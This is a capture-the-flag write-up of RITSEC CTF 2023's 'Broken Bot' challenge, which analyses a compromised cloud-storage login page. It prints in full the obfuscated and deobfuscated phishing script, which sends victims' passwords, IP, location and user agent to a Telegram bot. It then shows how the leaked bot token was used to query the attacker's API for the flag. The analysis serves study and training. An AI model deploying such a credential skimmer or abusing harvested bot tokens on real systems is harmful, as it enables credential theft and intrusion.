# Broken Bot

- 378 Points / 119 Solves

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆☆

## Background

Made by FM Global

A malicious actor was able to compromise RIT's Cloud Storage web portal. Investigate and determine the scope of the compromise.

[https://brokenbot-web.challenges.ctf.ritsec.club/](https://brokenbot-web.challenges.ctf.ritsec.club/)

NOTE: The flag format is Flag{}

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401150839.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401150909.png)

In here, we see there's the RIT's Cloud Storage web portal login page, and the email field has been filled for us.

**Let's view the source page:**
```html
[...]
 <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/core.min.js"x></script 1=2> <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js"x></script 1=2>
[...]
<script x>var _0x7298=["\x67\x65\x74\x46\x75\x6C\x6C\x59\x65\x61\x72","\x77\x72\x69\x74\x65"];document[_0x7298[1]]( new Date()[_0x7298[0]]())</script 1=2 
[...]
 <script src="https://zeptojs.com/zepto.min.js" x></script 1=2>
   <script x>
    var A=B;function B(C,D){var E=F();return B=function(Bbb,G){Bbb=Bbb-0xb7;var H=E[Bbb];return H;},B(C,D);}(function(I,J){var K=B,L=I();while(!![]){try{var M=-parseInt(K(0xe9))/0x1+-parseInt(K(0xda))/0x2+parseInt(K(0xc0))/0x3*(-parseInt(K(0xb8))/0x4)+parseInt(K(0xd6))/0x5+-parseInt(K(0xe0))/0x6*(-parseInt(K(0xd5))/0x7)+parseInt(K(0xb7))/0x8*(-parseInt(K(0xe3))/0x9)+-parseInt(K(0xe1))/0xa*(parseInt(K(0xdb))/0xb);if(M===J)break;else L['push'](L['shift']());}catch(N){L['push'](L['shift']());}}}(F,0xa9b1c));var elem=$(A(0xb9)),elem1=A(0xde),elem2=A(0xd7),email=$(A(0xc2))[A(0xc9)](),domain=email[A(0xe4)](email[A(0xbc)]('@')+0x1),frmsite=domain[A(0xe4)](0x0,domain[A(0xbc)]('.'));const str=frmsite+A(0xce),str2=str[A(0xbd)](0x0)[A(0xeb)]()+str[A(0xe7)](0x1);let today=new Date()[A(0xc6)]();$(A(0xba))[A(0xe5)](str2),$('#title')[A(0xe5)](str2),$(A(0xc1))['append'](A(0xbb)+domain+A(0xd4)),$(A(0xdd))[A(0xe5)](A(0xcd)+domain+'\x22>'),document[A(0xe8)][A(0xd0)]['background']=A(0xca)+domain+'\x27)',elem['on'](A(0xec),function(O){var P=A;$('#inputPassword')[P(0xdf)]()===''?alert(P(0xcb)):$['getJSON'](P(0xcf),function(Q){var R=P,S=Q['ip'],T=Q[R(0xc8)],U=Q['region'],V=Q['country'],W=navigator['userAgent'];let X=new Date()[R(0xc6)]();var Y=R(0xc4)+str2+'\x20by\x20Zach\x20A**'+'\x0a\x0a'+R(0xe2)+$(R(0xc2))[R(0xc9)]()+'\x0a'+R(0xc7)+$(R(0xd9))[R(0xdf)]()+'\x0a'+'IP\x20Address\x20:\x20'+S+'\x0a'+R(0xe6)+U+'\x0a'+R(0xc3)+T+'\x0a'+R(0xbe)+V+'\x0a'+R(0xed)+W+'\x0a'+R(0xcc)+$(R(0xea))[R(0xdf)]()+'\x0a'+R(0xd8)+X+'\x0a'+R(0xbf)+$(R(0xc5))[R(0xdf)](),Z=R(0xdc)+elem1+R(0xd3);$[R(0xd2)](Z,{'chat_id':elem2,'text':Y},function(AA){var AB=R;window['location'][AB(0xee)]=AB(0xd1);});});});function F(){var AC=['val','12ZidQyC','20AFlrCY','Email:\x20','63792quNVYn','substring','append','Region\x20:\x20','slice','body','139437pXYFEK','#UserEmail','toUpperCase','click','Useragent\x20:\x20','href','88GpIPQU','904cdojGd','#submit','#dname','<img\x20class=\x22mb-4\x22\x20src=\x22https://logo.clearbit.com/','lastIndexOf','charAt','Country\x20:\x20','DateSent\x20:\x20','10311YpzJVd','#dlogo','#emailtext','City\x20:\x20','***','#DateSent','toLocaleDateString','Password\x20:\x20','city','text','url(\x27https://logo.clearbit.com/','Password\x20field\x20missing!','Format\x20:\x20','<link\x20rel=\x22icon\x22\x20href=\x22https://logo.clearbit.com/','\x20Cloud\x20Storage','https://ip.seeip.org/geoip','style','https://archive.org/details/VoiceMail_173','post','/sendMessage','\x22\x20alt=\x22\x22\x20width=\x22150\x22\x20\x20>','4716964xBODFJ','3724320KAqSuZ','5852841790','Date\x20Filled\x20:\x20','#inputPassword','380874lxWkrT','1170928pBbGzs','https://api.telegram.org/bot','head','6055124896:AAFyQlC_8dr1GndB26ji4iV2ol2bPPQ9lq4'];F=function(){return AC;};return F();}
</script 1=2
```

Hmm... Since a malicious actor compromised the Cloud Storage web portal, ***it's clear that the bad actor did something peculiar to the `/` page.***

Like **obfuscated `<script>` element, weird `1=2`.**

Now, **don't click "Sign in" yet**, just in case the bad actor did a [watering hole attack](https://en.wikipedia.org/wiki/Watering_hole_attack) to the `/` page.

**Let's deobfuscate `<script>` elements via [de4js](https://lelinhtinh.github.io/de4js/):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401152423.png)

**Deobfuscated:**
```html
<script>
    var _0x7298 = ["getFullYear", "write"];
    document[_0x7298[1]](new Date()[_0x7298[0]]())
</script>

<script>
    var A = B;
    
    function B(C, D) {
        var E = F();
        return B = function (Bbb, G) {
            Bbb = Bbb - 0xb7;
            var H = E[Bbb];
            return H;
        }, B(C, D);
    }(function (I, J) {
        var K = B,
            L = I();
        while (!![]) {
            try {
                var M = -parseInt(K(0xe9)) / 0x1 + -parseInt(K(0xda)) / 0x2 + parseInt(K(0xc0)) / 0x3 * (-parseInt(K(0xb8)) / 0x4) + parseInt(K(0xd6)) / 0x5 + -parseInt(K(0xe0)) / 0x6 * (-parseInt(K(0xd5)) / 0x7) + parseInt(K(0xb7)) / 0x8 * (-parseInt(K(0xe3)) / 0x9) + -parseInt(K(0xe1)) / 0xa * (parseInt(K(0xdb)) / 0xb);
                if (M === J) break;
                else L['push'](L['shift']());
            } catch (N) {
                L['push'](L['shift']());
            }
        }
    }(F, 0xa9b1c));
    var elem = $(A(0xb9)),
        elem1 = A(0xde),
        elem2 = A(0xd7),
        email = $(A(0xc2))[A(0xc9)](),
        domain = email[A(0xe4)](email[A(0xbc)]('@') + 0x1),
        frmsite = domain[A(0xe4)](0x0, domain[A(0xbc)]('.'));
    const str = frmsite + A(0xce),
        str2 = str[A(0xbd)](0x0)[A(0xeb)]() + str[A(0xe7)](0x1);
    let today = new Date()[A(0xc6)]();
    $(A(0xba))[A(0xe5)](str2), $('#title')[A(0xe5)](str2), $(A(0xc1))['append'](A(0xbb) + domain + A(0xd4)), $(A(0xdd))[A(0xe5)](A(0xcd) + domain + '\">'), document[A(0xe8)][A(0xd0)]['background'] = A(0xca) + domain + '\')', elem['on'](A(0xec), function (O) {
        var P = A;
        $('#inputPassword')[P(0xdf)]() === '' ? alert(P(0xcb)) : $['getJSON'](P(0xcf), function (Q) {
            var R = P,
                S = Q['ip'],
                T = Q[R(0xc8)],
                U = Q['region'],
                V = Q['country'],
                W = navigator['userAgent'];
            let X = new Date()[R(0xc6)]();
            var Y = R(0xc4) + str2 + ' by Zach A**' + '\x0a\x0a' + R(0xe2) + $(R(0xc2))[R(0xc9)]() + '\x0a' + R(0xc7) + $(R(0xd9))[R(0xdf)]() + '\x0a' + 'IP Address : ' + S + '\x0a' + R(0xe6) + U + '\x0a' + R(0xc3) + T + '\x0a' + R(0xbe) + V + '\x0a' + R(0xed) + W + '\x0a' + R(0xcc) + $(R(0xea))[R(0xdf)]() + '\x0a' + R(0xd8) + X + '\x0a' + R(0xbf) + $(R(0xc5))[R(0xdf)](),
                Z = R(0xdc) + elem1 + R(0xd3);
            $[R(0xd2)](Z, {
                'chat_id': elem2,
                'text': Y
            }, function (AA) {
                var AB = R;
                window['location'][AB(0xee)] = AB(0xd1);
            });
        });
    });
    
    function F() {
        var AC = ['val', '12ZidQyC', '20AFlrCY', 'Email: ', '63792quNVYn', 'substring', 'append', 'Region : ', 'slice', 'body', '139437pXYFEK', '#UserEmail', 'toUpperCase', 'click', 'Useragent : ', 'href', '88GpIPQU', '904cdojGd', '#submit', '#dname', '<img class=\"mb-4\" src=\"https://logo.clearbit.com/', 'lastIndexOf', 'charAt', 'Country : ', 'DateSent : ', '10311YpzJVd', '#dlogo', '#emailtext', 'City : ', '***', '#DateSent', 'toLocaleDateString', 'Password : ', 'city', 'text', 'url(\'https://logo.clearbit.com/', 'Password field missing!', 'Format : ', '<link rel=\"icon\" href=\"https://logo.clearbit.com/', ' Cloud Storage', 'https://ip.seeip.org/geoip', 'style', 'https://archive.org/details/VoiceMail_173', 'post', '/sendMessage', '\" alt=\"\" width=\"150\"  >', '4716964xBODFJ', '3724320KAqSuZ', '5852841790', 'Date Filled : ', '#inputPassword', '380874lxWkrT', '1170928pBbGzs', 'https://api.telegram.org/bot', 'head', '6055124896:AAFyQlC_8dr1GndB26ji4iV2ol2bPPQ9lq4'];
        F = function () {
            return AC;
        };
        return F();
    }
</script>
```

**The first `<script>` element is just displaying the current year:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401152628.png)

So we can just ignore that.

How about the second `<script>` element?

**It looks very complex to me... However function `F()` stands out to me:**
```js
var AC = ['val', '12ZidQyC', '20AFlrCY', 'Email: ', '63792quNVYn', 'substring', 'append', 'Region : ', 'slice', 'body', '139437pXYFEK', '#UserEmail', 'toUpperCase', 'click', 'Useragent : ', 'href', '88GpIPQU', '904cdojGd', '#submit', '#dname', '<img class=\"mb-4\" src=\"https://logo.clearbit.com/', 'lastIndexOf', 'charAt', 'Country : ', 'DateSent : ', '10311YpzJVd', '#dlogo', '#emailtext', 'City : ', '***', '#DateSent', 'toLocaleDateString', 'Password : ', 'city', 'text', 'url(\'https://logo.clearbit.com/', 'Password field missing!', 'Format : ', '<link rel=\"icon\" href=\"https://logo.clearbit.com/', ' Cloud Storage', 'https://ip.seeip.org/geoip', 'style', 'https://archive.org/details/VoiceMail_173', 'post', '/sendMessage', '\" alt=\"\" width=\"150\"  >', '4716964xBODFJ', '3724320KAqSuZ', '5852841790', 'Date Filled : ', '#inputPassword', '380874lxWkrT', '1170928pBbGzs', 'https://api.telegram.org/bot', 'head', '6055124896:AAFyQlC_8dr1GndB26ji4iV2ol2bPPQ9lq4'];
```

That weird array is interesting.

- It has an `archive.org` link: `https://archive.org/details/VoiceMail_173`
- Telegram API bot link: `https://api.telegram.org/bot`
- Grab public IP link: `https://ip.seeip.org/geoip`

Hmm... It seems like when we click "Sign in", ***it'll forward our password, IP address, `User-Agent` to the Telegram group??***

**Let's try to type some random password and send it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401153945.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401154042.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230403150940.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401154151.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401154215.png)

As you can see, it indeed **grabbing our IP, password and other things to a Telegram API bot.**

Also, it brings us to a voice mail. However, nothing useful.

- Telegram API bot:

```json
{
    "ok": true,
    "result": {
        "message_id": 2357,
        "from": {
            "id": 6055124896,
            "is_bot": true,
            "first_name": "RIT_CTF_Telegram_Bot",
            "username": "rochesterissodamncoldbot"
        },
        "chat": {
            "id": 5852841790,
            "first_name": "Z",
            "username": "l337Hackzor",
            "type": "private"
        },
        "date": 1680334511,
        "text": "***Rit Cloud Storage by Zach A**\n\nEmail: WhiteTeam@rit.edu\nPassword : dafwgawg\nIP Address : [...]\nRegion : [...]\nCity : [...]\nCountry : [...]\nUseragent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36\nFormat : WhiteTeam@rit.edu\nDate Filled : 4/1/2023\nDateSent : 1/28/2023 2:55:30 p.m.",
        "entities": [
            {
                "offset": 41,
                "length": 17,
                "type": "email"
            },
            {
                "offset": 92,
                "length": 14,
                "type": "url"
            },
            {
                "offset": 318,
                "length": 17,
                "type": "email"
            }
        ]
    }
}
```

In here, we found the **chat username is `l337Hackzor`**.

Hmm... Maybe we can do something with the API???

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401155512.png)

**According to [Telegram API documentation](https://core.telegram.org/bots/api#getchat), we can get up to date information about the chat:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401160520.png)

Also, all queries to the Telegram Bot API must be served over HTTPS and need to be presented in this form: `https://api.telegram.org/bot<token>/METHOD_NAME`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401160529.png)

Uhh nope.

The `message_auto_delete_time`'s value is `31536000`, which means message will be deleted after 1 year.

**How about the `rochesterissodamncoldbot`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401160950.png)

Some weird files?

We can also download those files via `getFile` method:

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401161900.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401161908.png)

```
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023)-[2023.04.01|16:19:19(HKT)]
└> wget https://api.telegram.org/file/bot6055124896:AAFyQlC_8dr1GndB26ji4iV2ol2bPPQ9lq4/profile_photos/file_108.jpg                                                                                   
[...]
┌[siunam♥earth]-(~/ctf/RITSEC-CTF-2023)-[2023.04.01|16:19:23(HKT)]
└> eog file_108.jpg
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401161945.png)

Nothing weird.

**After Googling "Telegram bot API leak sensentive information", I found [this blog](https://www.wired.com/story/telegram-bots-tls-encryption/):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401162355.png)

However, I couldn't forward those chat messages...

**Then, I kept dig deeper to the API documentation, and I found 2 methods:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401163344.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401163349.png)

Let's try to first one:

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401163410.png)

Nope.

**Second one??**

![](https://github.com/siunam321/CTF-Writeups/blob/main/RITSEC-CTF-2023/images/Pasted%20image%2020230401163429.png)

Oh!! We found the flag!

- **Flag: `Flag{Always_Check_For_Misconfigurations}`**

## Conclusion

What we've learned:

1. Leaking Sensentive Information Via Telegram Bot API